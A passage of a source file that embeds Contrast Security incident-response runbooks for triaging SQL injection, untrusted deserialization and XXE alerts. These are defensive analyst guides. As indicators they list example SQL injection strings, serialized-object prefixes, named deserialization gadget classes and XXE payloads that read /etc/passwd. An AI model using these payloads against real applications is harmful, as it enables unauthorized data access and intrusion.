      `Jul 18 2024 13:14:35.740-0400 192.168.0.158 CEF:0|Contrast Security|Contrast Agent Java|6.5.4|SECURITY|The parameter lastName had a value that matched a signature for, but did not successfully exploit, sql-injection - doe' or 1=1 AND|WARN|pri=sql-injection src=0:0:0:0:0:0:0:1 spt=8080 request=/error requestMethod=GET app=Web Application outcome=INEFFECTIVE`\s
       \s
       \s
       \s


      \\
      What is the “outcome” of the event you are triaging? (click to proceed) \s

      - [Exploited](#exploited)
      - [Blocked](#blocked)

      - [Ineffective](#ineffective)
      - [Success](#success)


      ## Exploited

      An "Exploited" outcome means Contrast detected an input coming into an application that looked like SQL injection, and then confirmed the input was used in a SQL query that modified the meaning of that query. \s

      To verify this is a true positive, review the following attributes of the event for common indicators: \s

      - Are there SQL Keywords (JOIN, UNION, DROP, SELECT, AND, OR, SLEEP, etc) that change the logic of the query?
      - Are there SQL tautologies (1=1, ‘test’=’test’, and so on) that may change the boolean logic of an AND or OR statement?
      - Is the IP address from a pentester or known vulnerability scanner IP?
      - Are there SQL comments that comment-out parts of the query?
      - Are there unusual query execution times or error messages related to SQL around the same timestamp as the event?
      - Are there application logs with SQL error messages around the same timestamp as the event?



      \\
      Examples:

      - `DROP sampletable;--`
      - `' or 1=1--`
      - `' UNION SELECT 1, 'anotheruser', 'doesnt matter', 1–`
      - `?id=1 AND (SELECT * FROM (SELECT NAME_CONST(database(),1),NAME_CONST(database(),1)) as x)--`
      - `select load_file('\\\\error\\abc');`
      - `?id=1 OR IF(MID(@@version,1,1)='5',sleep(1),1)='2'` \s

      \\
      Does the event appear to be a true positive? (click to proceed) \s

      - [No](#exploited-false-positive) \s
      - [Yes, or unsure](#exploited-true-positive) \s



      ## Blocked

      "Blocked" means Contrast detected an input coming into an application that looked like SQL injection and then confirmed the input was used in a SQL query and modified the meaning of that query, and therefore blocked the application from performing the query. \s

      To verify this is a true positive, review the following attributes of the event:

      - Are there SQL Keywords (JOIN, UNION, DROP, SELECT, AND, OR, SLEEP, etc) that change the logic of the query?
      - Are there SQL tautologies (1=1, ‘test’=’test’, and so on) that may change the boolean logic of an AND or OR statement?
      - Is the IP address from a pentester or known vulnerability scanner IP?
      - Are there SQL comments that comment-out parts of the query?
      - Are there unusual query execution times or error messages related to SQL around the same timestamp as the event?
      - Are there application logs with SQL error messages around the same timestamp as the event?


      \\
      Examples:

      - `DROP sampletable;--`
      - `' or 1=1--`
      - `' UNION SELECT 1, 'anotheruser', 'doesnt matter', 1–`
      - `?id=1 AND (SELECT * FROM (SELECT NAME_CONST(database(),1),NAME_CONST(database(),1)) as x)--`
      - `select load_file('\\\\error\\abc');`
      - `?id=1 OR IF(MID(@@version,1,1)='5',sleep(1),1)='2'` \s


      \\
      Is the event a true positive? (click to proceed)

      - [No](#blocked-false-positive) \s
      - [Yes, or unsure](#blocked-true-positive) \s






      ## Ineffective

      "Ineffective" means Contrast detected an input coming into an application that looked like SQL injection, but did not confirm that the input was used in a SQL query and modified the meaning of that query.. This is called a “Probe” within the Contrast UI. This event is a real attack attempt to exploit your application, but it was ineffective. Probes can indicate an attacker scanning or exploring for vulnerabilities.

      - Does the probe event appear to be caused by legitimate traffic and numerous similar probe events are being generated, an [exclusion](https://docs.contrastsecurity.com/en/application-exclusions.html) can be configured to clean up Contrast data. \s
      - Is the probe originating from a specific ip[s] that is a real external IP address (not internal load balancer or network device) and not the public IP address for a large company network?   Consider… \s
        - Block using network appliance
        - [Block using Contrast](https://docs.contrastsecurity.com/en/ip-management.html)
      - Are all of the events originating from the same application user account \s
        - Determine if the account is a legitimate account
        - If so, attempt to help them recover the account by contacting and authenticating the legitimate user, arranging to change their credentials, and recover from any damage.
        - If not,  consider the following options:
          - Ban the account
          - Disable the account
          - Delete the account

      \\
      [Proceed to Post-Incident Activities](#post-incident-activities) \s


      ## Success

      “Success" means that Contrast's security measures functioned as intended, preventing unauthorized access or potentially malicious activity from reaching the application. This could be due to a [virtual patch](https://docs.contrastsecurity.com/en/virtual-patches.html), [IP block](https://docs.contrastsecurity.com/en/block-or-allow-ips.html), or [bot block rule](https://docs.contrastsecurity.com/en/server-configuration.html#:~:text=Bot%20blocking%20blocks%20traffic%20from,Events%2C%20use%20the%20filter%20options.) being triggered. \s

      Generally, these events don't necessitate action because they signify the system is working correctly. \s

      However, further investigation may be beneficial in specific scenarios to gain more insights or proactively enhance security:

      - Should the event have been blocked?:
        - If the event is from an [IP block](https://docs.contrastsecurity.com/en/block-or-allow-ips.html):
          - Correlate the IP address with other events to identify any attempted malicious actions.
          - Look up the IP address's reputation and origin to determine if it's known for malicious activity.
          - Check if the IP is listed on any other denylists across your systems.
        - If the event is from a [Virtual Patch](https://docs.contrastsecurity.com/en/virtual-patches.html):
          - Correlate the event with any exploited or probed events.
          - Confirm if the virtual patch is protecting a known vulnerability in the application.
        - If the event is from a [Bot Block](https://docs.contrastsecurity.com/en/server-configuration.html#:~:text=Bot%20blocking%20blocks%20traffic%20from,Events%2C%20use%20the%20filter%20options.):
          - Analyze the user-agent header of the HTTP request. Only requests originating from known scanning, fuzzing, or malicious user-agents should be blocked.

      \\
      If the event appears to be for legitimate traffic, an [exclusion](https://docs.contrastsecurity.com/en/application-exclusions.html) can be configured. \s

      \\
      [Proceed to Post-Incident Activities](#post-incident-activities) \s


      ## Exploited True Positive \s

      It is possible that the event is a True Positive, but is benign. A Benign True Positive is when an application relies on vulnerable behavior that could potentially be exploited, but is currently necessary for operation. This determination will often require the assistance of the development or application security teams. \s

      If the event appears to be a Benign True Positive, click [here](#benign-true-positive). \s

      \\
      If it does not appear to be a Benign True Positive, the most immediate action to stop an "active" attack would be to block the current attacker of the exploited event, while further triage could result in a [virtual patch](https://docs.contrastsecurity.com/en/virtual-patches.html)/[enabling block mode](https://docs.contrastsecurity.com/en/set-protect-rules.html) for the rule: \s

      - Is the attack originating from a specific IP[s] that is a real external IP address (not internal load balancer or network device) and not the public IP address for a large company network?
        - Block using network appliance \s
        - [Block using Contrast](https://docs.contrastsecurity.com/en/ip-management.html) \s
      - Are all of the events originating from the same application user account?
        - Determine if the account is a legitimate account \s
        - If so, attempt to help them recover the account by contacting and authenticating the legitimate user, arranging to change their credentials, and recover from any damage.
        - If not,  consider the following options:
          - Ban the account
          - Disable the account
          - Delete the account

      \\
      \\
      Once the current attack has been stopped, consider taking additional steps to prevent future exploitation. \s

      - If the only “Exploited” events for this rule are true positives, then the rule can be [switched to “Block” mode](https://docs.contrastsecurity.com/en/set-protect-rules.html) which will prevent future exploitation. \s
      - If there are other “Exploited” events that appear to be legitimate, benign traffic, then “Block” mode would block those events as well, which could have negative impact to the application. \s
        - Before enabling “Block” mode for this situation, you must first exclude the legitimate, benign traffic being caught in the rule. \s
        - Alternatively, you can set up a [Virtual Patch](https://docs.contrastsecurity.com/en/virtual-patches.html) that only allows the legitimate, benign traffic through and any non-matches will be blocked.

      If none of the above options are satisfactory and it's perceived the application is at great risk, you can consider shutting down the application or removing network connectivity. \s

      \\
      \\
      Post Containment

      - If confirmed this is a True Positive, it should be raised with the appsec/dev teams to get fixed. Useful information for those teams would be: \s

        - Application name
        - Is app in production, development, staging, etc
        - Affected URL
        - Attack payload
        - Stack trace of the request
      - To better understand the extent of the incident and to ensure the attack is no longer occurring, look for other IOCs:
        - Did the same IP Address Generate Other Alerts?
        - Is the vulnerability being exploited by other actors?
        - Spike in traffic or repeated access patterns to the vulnerable URL
        - Correlate exploited events with any "probed" or "blocked" events
        - If the attack was able to execute commands on the server, the server may need to be considered compromised and reviewed for persistence and other lateral movement.

      \\
      \\
      [Proceed to Post-Incident Activities](#post-incident-activities) \s



      ## Exploited False Positive \s

      If the event seems to be a False Positive, consider the following options:

      - Ignore
      - [Create Exclusion](https://docs.contrastsecurity.com/en/application-exclusions.html)

      \\
      [Proceed to Post-Incident Activities](#post-incident-activities) \s








      ## Blocked True Positive \s

      It is possible that the event is a True Positive, but benign. A Benign True Positive is when an application’s design relies on vulnerable behavior that could potentially be exploited, but is currently necessary for operation. This determination will often require the assistance of the development or application security teams. \s

      If the event appears to be a Benign True Positive, click [here](#benign-true-positive).

      If it does not appear to be a Benign True Positive, consider the following options:

      - If one IP address is generating a lot of blocked events, it's probably worthwhile to block it. \s
      - Notify Dev/Appsec team of Vulnerability. Useful information for those teams would be: \s
        - Application name
        - Is app in production, development, staging, etc
        - Affected URL
        - payload
        - Stack trace of the request \s
      - Look for IOCs of further attacks in other parts/inputs of the application
        - Other blocked or probed events? \s
        - Did anything show up as "exploited" indicating a different rule did not have blocking enabled?
      - Ignore

      [Proceed to Post-Incident Activities](#post-incident-activities) \s



      ## Blocked False Positive \s

      If the event seems to be a False Positive, then Contrast may be blocking legitimate usage of the application, therefore negatively impacting it.

      - Create an exclusion to allow the legitimate traffic through so that you can continue to be protected by “Block” mode without the negative impact.
      - Alternatively, you can set up a Virtual Patch that only allows legitimate traffic through and any non-matches (attack traffic) will be blocked. \s
      - If neither of the above options are satisfactory and the negative impact of the application must be avoided, you can switch the rule to “Monitor” mode.

      [Proceed to Post-Incident Activities](#post-incident-activities) \s


      ## Benign True Positive

      To review, a Benign True Positive occurs when an application relies on vulnerable behavior that could potentially be exploited, but is currently necessary for operation. Consider the following options:

      - Ignore
      - Create Exclusion \s
      - Work with the application developer on alternative implementations that do not pose such risk to the application, but meets the business needs.

      ## Post-Incident Activities

      - **Documentation**
        - **Incident Report:** Document the incident, including findings, raw events and alerts, actions taken, assets impacted, and lessons learned.
        - **Update Documentation:** Keep security runbooks and documentation up to date.
      - **Communication**
        - **Notify Stakeholders:** Inform relevant stakeholders about the incident and steps taken.
        - **User Notification:** Notify affected users if there was a data breach.
      - **Review and Improve**
        - **Review Response:** Conduct a post-mortem to review the response and identify improvement areas.
        - **Enhance Security Posture:** Implement additional security measures and improve monitoring. \s\
      """),
  UNTRUSTED_DESERIALIZATION(
      List.of("untrusted-deserialization"),
      """
      ---
      layout: runbook
      title: "Untrusted Deserialization"
      description: "Guide for handling attacks where attackers pass arbitrary objects or code to a deserializer, potentially enabling denial of service, authentication bypass, or remote code execution"
      ---

      <!-- \\ or two whitespaces used for line breaks -->
      # Untrusted Deserialization Runbook

      Serialization refers to the process of converting an object into a format which can be saved to a file or a datastore. Deserialization reverses this process, transforming serialized data coming from a file, stream, or network socket into an object.Untrusted Deserialization is a web application vulnerability that enables attackers to pass arbitrary objects or code to a deserializer. In this kind of attack, untrusted data abuses the logic of an application to inflict a denial of service (DoS) attack, achieve authentication bypass, enable remote code execution, and even execute arbitrary code as it is being deserialized.


      Example Event - Exploited outcome Untrusted Deserialization \s
      `Oct 18 12:36:11 192.168.12.70 CEF:0|Contrast Security|Contrast Agent Java|6.9.0|SECURITY|The input UNKNOWN had a value that successfully exploited untrusted-deserialization - java.net.URL|WARN|pri=untrusted-deserialization src=0:0:0:0:0:0:0:1 spt=8080 request=/deserialize requestMethod=GET app=webapplication outcome=EXPLOITED` \s
       \s
       \s

      Example Event - Blocked outcome Untrusted Deserialization \s
      `Oct 18 12:39:34 192.168.12.70 CEF:0|Contrast Security|Contrast Agent Java|6.9.0|SECURITY|The input UNKNOWN had a value that successfully exploited untrusted-deserialization - java.net.URL|WARN|pri=untrusted-deserialization src=0:0:0:0:0:0:0:1 spt=8080 request=/deserialize requestMethod=GET app=webapplication outcome=BLOCKED`
       \s
       \s


      \\
      What is the “outcome” of the event you are triaging? (click to proceed) \s

      - [Exploited](#exploited)
      - [Blocked](#blocked)

      - [Ineffective](#ineffective)
      - [Success](#success)


      ## Exploited

      "Exploited" means Contrast detected serialized input coming into the application and then confirmed it was subsequently deserialized and contained a known vulnerable gadget token, or an operating system command was executed as part of the deserialization process. \s

      To verify this is a true positive, review the following attributes of the event for common indicators: \s

      - Did the application deserialize data from user controllable input?
      - Does the payload contain a [known gadget](https://github.com/frohoff/ysoserial)?
      - Does the decoded payload look like a binary object?
      - Does the payload represent a Java serialized object? (It should start with 'rO0AB')
      - Does the payload represent a .NET serialized object? (It should start with 'AAEAAAD')
      - Are there application logs with serialization error messages around the same timestamp as the event?



      \\
      Examples:

      - `.Net - AAEAAAD/////AQAAAAAAAAAMAgAAAF9TeXN0ZW0u[...]0KPC9PYmpzPgs=`
      - `Java - rO0ABXNyABFqYXZhL[...]D//////////3QACmdvb2GUuY29teA==`
      - `Known Java Gadget - com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl`
      - `Known Java Gadget - org.apache.commons.collections.functors.InvokerTransformer`
      - `Known Java Gadget - org.springframework.beans.factory.ObjectFactory`

      \\
      Does the event appear to be a true positive? (click to proceed) \s

      - [No](#exploited-false-positive) \s
      - [Yes, or unsure](#exploited-true-positive) \s



      ## Blocked

      "Blocked" means Contrast detected serialized input coming into the application and then confirmed it was being deserialized with a known vulnerable gadget token and therefore blocked the execution of it. \s

      To verify this is a true positive, review the following attributes of the event:

      - Did the application deserialize data from user controllable input?
      - Does the payload contain a [known gadget](https://github.com/frohoff/ysoserial)?
      - Does the decoded payload look like a binary object?
      - Does the payload represent a Java serialized object? (It should start with 'rO0AB')
      - Does the payload represent a .NET serialized object? (It should start with 'AAEAAAD')
      - Are there application logs with serialization error messages around the same timestamp as the event?


      \\
      Examples:

      - `.Net - AAEAAAD/////AQAAAAAAAAAMAgAAAF9TeXN0ZW0u[...]0KPC9PYmpzPgs=`
      - `Java - rO0ABXNyABFqYXZhL[...]D//////////3QACmdvb2GUuY29teA==`
      - `Known Java Gadget - com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl`
      - `Known Java Gadget - org.apache.commons.collections.functors.InvokerTransformer`
      - `Known Java Gadget - org.springframework.beans.factory.ObjectFactory`


      \\
      Is the event a true positive? (click to proceed)

      - [No](#blocked-false-positive) \s
      - [Yes, or unsure](#blocked-true-positive) \s






      ## Ineffective

      "Ineffective" means that Contrast detected an input resembling a serialized string but did not confirm it was deserialized unsafely. This is called a “Probe” within the Contrast UI. This event is an unsuccessful attempt at an exploit. They can indicate an attack fuzzing and looking for vulnerabilities.

      - Does the probe event appear to be caused by legitimate traffic and numerous similar probe events are being generated, an [exclusion](https://docs.contrastsecurity.com/en/application-exclusions.html) can be configured to clean up Contrast data. \s
      - Is the probe originating from a specific ip[s] that is a real external IP address (not internal load balancer or network device) and not the public IP address for a large company network?   Consider… \s
        - Block using network appliance
        - [Block using Contrast](https://docs.contrastsecurity.com/en/ip-management.html)
      - Are all of the events originating from the same application user account \s
        - Determine if the account is a legitimate account
        - If so, attempt to help them recover the account by contacting and authenticating the legitimate user, arranging to change their credentials, and recover from any damage.
        - If not,  consider the following options:
          - Ban the account
          - Disable the account
          - Delete the account

      \\
      [Proceed to Post-Incident Activities](#post-incident-activities) \s


      ## Success

      “Success" means that Contrast's security measures functioned as intended, preventing unauthorized access or potentially malicious activity from reaching the application. This could be due to a [virtual patch](https://docs.contrastsecurity.com/en/virtual-patches.html), [IP block](https://docs.contrastsecurity.com/en/block-or-allow-ips.html), or [bot block rule](https://docs.contrastsecurity.com/en/server-configuration.html#:~:text=Bot%20blocking%20blocks%20traffic%20from,Events%2C%20use%20the%20filter%20options.) being triggered. \s

      Generally, these events don't necessitate action because they signify the system is working correctly. \s

      However, further investigation may be beneficial in specific scenarios to gain more insights or proactively enhance security:

      - Should the event have been blocked?:
        - If the event is from an [IP block](https://docs.contrastsecurity.com/en/block-or-allow-ips.html):
          - Correlate the IP address with other events to identify any attempted malicious actions.
          - Look up the IP address's reputation and origin to determine if it's known for malicious activity.
          - Check if the IP is listed on any other denylists across your systems.
        - If the event is from a [Virtual Patch](https://docs.contrastsecurity.com/en/virtual-patches.html):
          - Correlate the event with any exploited or probed events.
          - Confirm if the virtual patch is protecting a known vulnerability in the application.
        - If the event is from a [Bot Block](https://docs.contrastsecurity.com/en/server-configuration.html#:~:text=Bot%20blocking%20blocks%20traffic%20from,Events%2C%20use%20the%20filter%20options.):
          - Analyze the user-agent header of the HTTP request. Only requests originating from known scanning, fuzzing, or malicious user-agents should be blocked.

      \\
      If the event appears to be for legitimate traffic, an [exclusion](https://docs.contrastsecurity.com/en/application-exclusions.html) can be configured. \s

      \\
      [Proceed to Post-Incident Activities](#post-incident-activities) \s


      ## Exploited True Positive \s

      It is possible that the event is a True Positive, but is benign. A Benign True Positive is when an application relies on vulnerable behavior that could potentially be exploited, but is currently necessary for operation. This determination will often require the assistance of the development or application security teams. \s

      If the event appears to be a Benign True Positive, click [here](#benign-true-positive). \s

      \\
      If it does not appear to be a Benign True Positive, the most immediate action to stop an "active" attack would be to block the current attacker of the exploited event, while further triage could result in a [virtual patch](https://docs.contrastsecurity.com/en/virtual-patches.html)/[enabling block mode](https://docs.contrastsecurity.com/en/set-protect-rules.html) for the rule: \s

      - Is the attack originating from a specific IP[s] that is a real external IP address (not internal load balancer or network device) and not the public IP address for a large company network?
        - Block using network appliance \s
        - [Block using Contrast](https://docs.contrastsecurity.com/en/ip-management.html) \s
      - Are all of the events originating from the same application user account?
        - Determine if the account is a legitimate account \s
        - If so, attempt to help them recover the account by contacting and authenticating the legitimate user, arranging to change their credentials, and recover from any damage.
        - If not,  consider the following options:
          - Ban the account
          - Disable the account
          - Delete the account

      \\
      \\
      Once the current attack has been stopped, consider taking additional steps to prevent future exploitation. \s

      - If the only “Exploited” events for this rule are true positives, then the rule can be [switched to “Block” mode](https://docs.contrastsecurity.com/en/set-protect-rules.html) which will prevent future exploitation. \s
      - If there are other “Exploited” events that appear to be legitimate, benign traffic, then “Block” mode would block those events as well, which could have negative impact to the application. \s
        - Before enabling “Block” mode for this situation, you must first exclude the legitimate, benign traffic being caught in the rule. \s
        - Alternatively, you can set up a [Virtual Patch](https://docs.contrastsecurity.com/en/virtual-patches.html) that only allows the legitimate, benign traffic through and any non-matches will be blocked.

      If none of the above options are satisfactory and it's perceived the application is at great risk, you can consider shutting down the application or removing network connectivity. \s

      \\
      \\
      Post Containment

      - If confirmed this is a True Positive, it should be raised with the appsec/dev teams to get fixed. Useful information for those teams would be: \s

        - Application name
        - Is app in production, development, staging, etc
        - Affected URL
        - Attack payload
        - Stack trace of the request
      - To better understand the extent of the incident and to ensure the attack is no longer occurring, look for other IOCs:
        - Did the same IP Address Generate Other Alerts?
        - Is the vulnerability being exploited by other actors?
        - Spike in traffic or repeated access patterns to the vulnerable URL
        - Correlate exploited events with any "probed" or "blocked" events
        - If the attack was able to execute commands on the server, the server may need to be considered compromised and reviewed for persistence and other lateral movement.

      \\
      \\
      [Proceed to Post-Incident Activities](#post-incident-activities) \s



      ## Exploited False Positive \s

      If the event seems to be a False Positive, consider the following options:

      - Ignore
      - [Create Exclusion](https://docs.contrastsecurity.com/en/application-exclusions.html)

      \\
      [Proceed to Post-Incident Activities](#post-incident-activities) \s








      ## Blocked True Positive \s

      It is possible that the event is a True Positive, but benign. A Benign True Positive is when an application’s design relies on vulnerable behavior that could potentially be exploited, but is currently necessary for operation. This determination will often require the assistance of the development or application security teams. \s

      If the event appears to be a Benign True Positive, click [here](#benign-true-positive).

      If it does not appear to be a Benign True Positive, consider the following options:

      - If one IP address is generating a lot of blocked events, it's probably worthwhile to block it. \s
      - Notify Dev/Appsec team of Vulnerability. Useful information for those teams would be: \s
        - Application name
        - Is app in production, development, staging, etc
        - Affected URL
        - payload
        - Stack trace of the request \s
      - Look for IOCs of further attacks in other parts/inputs of the application
        - Other blocked or probed events? \s
        - Did anything show up as "exploited" indicating a different rule did not have blocking enabled?
      - Ignore

      [Proceed to Post-Incident Activities](#post-incident-activities) \s



      ## Blocked False Positive \s

      If the event seems to be a False Positive, then Contrast may be blocking legitimate usage of the application, therefore negatively impacting it.

      - Create an exclusion to allow the legitimate traffic through so that you can continue to be protected by “Block” mode without the negative impact.
      - Alternatively, you can set up a Virtual Patch that only allows legitimate traffic through and any non-matches (attack traffic) will be blocked. \s
      - If neither of the above options are satisfactory and the negative impact of the application must be avoided, you can switch the rule to “Monitor” mode.

      [Proceed to Post-Incident Activities](#post-incident-activities) \s


      ## Benign True Positive

      To review, a Benign True Positive occurs when an application relies on vulnerable behavior that could potentially be exploited, but is currently necessary for operation. Consider the following options:

      - Ignore
      - Create Exclusion \s
      - Work with the application developer on alternative implementations that do not pose such risk to the application, but meets the business needs.

      ## Post-Incident Activities

      - **Documentation**
        - **Incident Report:** Document the incident, including findings, raw events and alerts, actions taken, assets impacted, and lessons learned.
        - **Update Documentation:** Keep security runbooks and documentation up to date.
      - **Communication**
        - **Notify Stakeholders:** Inform relevant stakeholders about the incident and steps taken.
        - **User Notification:** Notify affected users if there was a data breach.
      - **Review and Improve**
        - **Review Response:** Conduct a post-mortem to review the response and identify improvement areas.
        - **Enhance Security Posture:** Implement additional security measures and improve monitoring.\
      """),
  XXE(
      List.of("xxe"),
      """
      ---
      layout: runbook
      title: "XML External Entity Injection"
      description: "Guide for addressing XXE flaws in XML parsers where attackers can cause the parser to read local or remote resources as part of the document"
      ---

      <!-- \\ or two whitespaces used for line breaks -->
      # XML External Entity Injection Runbook

      XXE is a flaw in XML parsers where attackers can cause the parser to read local or remote resources as part of the document. Attackers often abuse this functionality to access other sensitive system information.


      Example Event - Exploited outcome XML External Entity Injection \s
      `Oct 18 10:37:49 192.168.12.70 CEF:0|Contrast Security|Contrast Agent Java|6.9.0|SECURITY|The input XML Prolog had a value that successfully exploited xxe - <?xml version\\=\\1.0" encoding\\="UTF-8"?> <!DOCTYPE foo [<!ENTITY example SYSTEM "/etc/passwd"> ]> <data>&example;</data> |WARN|pri=xxe src=0:0:0:0:0:0:0:1 spt=8080 request=/parse-xml requestMethod=POST app=web-application outcome=EXPLOITED` \s
       \s
       \s

      Example Event - Blocked outcome XML External Entity Injection \s
      `Oct 18 10:58:06 192.168.12.70 CEF:0|Contrast Security|Contrast Agent Java|6.9.0|SECURITY|The input XML Prolog had a value that successfully exploited xxe - <?xml version\\="1.0" encoding\\="UTF-8"?> <!DOCTYPE foo [<!ENTITY example SYSTEM "/etc/passwd"> ]> <data>&example;</data> |WARN|pri=xxe src=0:0:0:0:0:0:0:1 spt=8080 request=/parse-xml requestMethod=POST app=web-application outcome=BLOCKED`
       \s
       \s


      \\
      What is the “outcome” of the event you are triaging? (click to proceed) \s

      - [Exploited](#exploited)
      - [Blocked](#blocked)

      - [Ineffective](#ineffective)
      - [Success](#success)


      ## Exploited

      "Exploited" indicates that Contrast detected an incoming input resembling an XML string containing external entities and then confirmed the declared entities were resolved by the XML parser. \s

      To verify this is a true positive, review the following attributes of the event for common indicators: \s

      - Are entity declaration keywords present in the payload? (<!ENTITY, SYSTEM, PUBLIC, etc)
      - Are there references to external entities in the payload? (&example;)
      - Are there references to local files in the payload? (file:///, /etc/passwd, etc)
      - Are there references to remote files in the payload? (http://, https://, etc)
      - Are there application logs with XML parsing error messages around the same timestamp as the event?



      \\
      Examples:

      - `<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY example SYSTEM "/etc/passwd"> ]><data>&example;</data>`
      - `<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY example SYSTEM "http://localhost"> ]><data>&example;</data>` \s

      \\
      Does the event appear to be a true positive? (click to proceed) \s

      - [No](#exploited-false-positive) \s
      - [Yes, or unsure](#exploited-true-positive) \s



      ## Blocked

      "Blocked" indicates that Contrast detected an incoming input resembling an XML string containing external entities and then confirmed the declared entities were being resolved by the XML parser and therefore blocked the application from performing the operation. \s

      To verify this is a true positive, review the following attributes of the event:

      - Are entity declaration keywords present in the payload? (<!ENTITY, SYSTEM, PUBLIC, etc)
      - Are there references to external entities in the payload? (&example;)
      - Are there references to local files in the payload? (file:///, /etc/passwd, etc)
      - Are there references to remote files in the payload? (http://, https://, etc)
      - Are there application logs with XML parsing error messages around the same timestamp as the event?


      \\
      Examples:

      - `<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY example SYSTEM "/etc/passwd"> ]><data>&example;</data>`
      - `<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY example SYSTEM "http://localhost"> ]><data>&example;</data>` \s


      \\
      Is the event a true positive? (click to proceed)

      - [No](#blocked-false-positive) \s
      - [Yes, or unsure](#blocked-true-positive) \s






      ## Ineffective

      "Ineffective" means that Contrast detected an incoming input resembling an XML external entity injection, but it did not confirm that the entities were resolved. This is called a “Probe” within the Contrast UI. This event is a real attack attempt to exploit your application, but it was ineffective. Probes can indicate an attacker scanning or exploring for vulnerabilities.

      - Does the probe event appear to be caused by legitimate traffic and numerous similar probe events are being generated, an [exclusion](https://docs.contrastsecurity.com/en/application-exclusions.html) can be configured to clean up Contrast data. \s
      - Is the probe originating from a specific ip[s] that is a real external IP address (not internal load balancer or network device) and not the public IP address for a large company network?   Consider… \s
        - Block using network appliance
        - [Block using Contrast](https://docs.contrastsecurity.com/en/ip-management.html)
      - Are all of the events originating from the same application user account \s
        - Determine if the account is a legitimate account
        - If so, attempt to help them recover the account by contacting and authenticating the legitimate user, arranging to change their credentials, and recover from any damage.
        - If not,  consider the following options:
          - Ban the account
          - Disable the account
          - Delete the account

      \\
      [Proceed to Post-Incident Activities](#post-incident-activities) \s


      ## Success

      “Success" means that Contrast's security measures functioned as intended, preventing unauthorized access or potentially malicious activity from reaching the application. This could be due to a [virtual patch](https://docs.contrastsecurity.com/en/virtual-patches.html), [IP block](https://docs.contrastsecurity.com/en/block-or-allow-ips.html), or [bot block rule](https://docs.contrastsecurity.com/en/server-configuration.html#:~:text=Bot%20blocking%20blocks%20traffic%20from,Events%2C%20use%20the%20filter%20options.) being triggered. \s

      Generally, these events don't necessitate action because they signify the system is working correctly. \s

      However, further investigation may be beneficial in specific scenarios to gain more insights or proactively enhance security:

      - Should the event have been blocked?:
        - If the event is from an [IP block](https://docs.contrastsecurity.com/en/block-or-allow-ips.html):
          - Correlate the IP address with other events to identify any attempted malicious actions.
          - Look up the IP address's reputation and origin to determine if it's known for malicious activity.
          - Check if the IP is listed on any other denylists across your systems.
        - If the event is from a [Virtual Patch](https://docs.contrastsecurity.com/en/virtual-patches.html):
          - Correlate the event with any exploited or probed events.
          - Confirm if the virtual patch is protecting a known vulnerability in the application.
        - If the event is from a [Bot Block](https://docs.contrastsecurity.com/en/server-configuration.html#:~:text=Bot%20blocking%20blocks%20traffic%20from,Events%2C%20use%20the%20filter%20options.):
          - Analyze the user-agent header of the HTTP request. Only requests originating from known scanning, fuzzing, or malicious user-agents should be blocked.

      \\
      If the event appears to be for legitimate traffic, an [exclusion](https://docs.contrastsecurity.com/en/application-exclusions.html) can be configured. \s

      \\
      [Proceed to Post-Incident Activities](#post-incident-activities) \s


      ## Exploited True Positive \s

      It is possible that the event is a True Positive, but is benign. A Benign True Positive is when an application relies on vulnerable behavior that could potentially be exploited, but is currently necessary for operation. This determination will often require the assistance of the development or application security teams. \s

      If the event appears to be a Benign True Positive, click [here](#benign-true-positive). \s

      \\
      If it does not appear to be a Benign True Positive, the most immediate action to stop an "active" attack would be to block the current attacker of the exploited event, while further triage could result in a [virtual patch](https://docs.contrastsecurity.com/en/virtual-patches.html)/[enabling block mode](https://docs.contrastsecurity.com/en/set-protect-rules.html) for the rule: \s

      - Is the attack originating from a specific IP[s] that is a real external IP address (not internal load balancer or network device) and not the public IP address for a large company network?
        - Block using network appliance \s
        - [Block using Contrast](https://docs.contrastsecurity.com/en/ip-management.html) \s
      - Are all of the events originating from the same application user account?
        - Determine if the account is a legitimate account \s
        - If so, attempt to help them recover the account by contacting and authenticating the legitimate user, arranging to change their credentials, and recover from any damage.
        - If not,  consider the following options:
          - Ban the account
          - Disable the account
          - Delete the account

      \\
      \\
      Once the current attack has been stopped, consider taking additional steps to prevent future exploitation. \s

      - If the only “Exploited” events for this rule are true positives, then the rule can be [switched to “Block” mode](https://docs.contrastsecurity.com/en/set-protect-rules.html) which will prevent future exploitation. \s
      - If there are other “Exploited” events that appear to be legitimate, benign traffic, then “Block” mode would block those events as well, which could have negative impact to the application. \s
        - Before enabling “Block” mode for this situation, you must first exclude the legitimate, benign traffic being caught in the rule. \s
        - Alternatively, you can set up a [Virtual Patch](https://docs.contrastsecurity.com/en/virtual-patches.html) that only allows the legitimate, benign traffic through and any non-matches will be blocked.

      If none of the above options are satisfactory and it's perceived the application is at great risk, you can consider shutting down the application or removing network connectivity. \s

      \\
      \\
      Post Containment

      - If confirmed this is a True Positive, it should be raised with the appsec/dev teams to get fixed. Useful information for those teams would be: \s

        - Application name
        - Is app in production, development, staging, etc
        - Affected URL
        - Attack payload
        - Stack trace of the request
      - To better understand the extent of the incident and to ensure the attack is no longer occurring, look for other IOCs:
        - Did the same IP Address Generate Other Alerts?
        - Is the vulnerability being exploited by other actors?
        - Spike in traffic or repeated access patterns to the vulnerable URL
        - Correlate exploited events with any "probed" or "blocked" events
        - If the attack was able to execute commands on the server, the server may need to be considered compromised and reviewed for persistence and other lateral movement.

      \\
      \\
      [Proceed to Post-Incident Activities](#post-incident-activities) \s



      ## Exploited False Positive \s

      If the event seems to be a False Positive, consider the following options:

      - Ignore
      - [Create Exclusion](https://docs.contrastsecurity.com/en/application-exclusions.html)

      \\
      [Proceed to Post-Incident Activities](#post-incident-activities) \s








      ## Blocked True Positive \s

      It is possible that the event is a True Positive, but benign. A Benign True Positive is when an application’s design relies on vulnerable behavior that could potentially be exploited, but is currently necessary for operation. This determination will often require the assistance of the development or application security teams. \s

      If the event appears to be a Benign True Positive, click [here](#benign-true-positive).

      If it does not appear to be a Benign True Positive, consider the following options:

      - If one IP address is generating a lot of blocked events, it's probably worthwhile to block it. \s
      - Notify Dev/Appsec team of Vulnerability. Useful information for those teams would be: \s
        - Application name
        - Is app in production, development, staging, etc
        - Affected URL
        - payload
        - Stack trace of the request \s
      - Look for IOCs of further attacks in other parts/inputs of the application
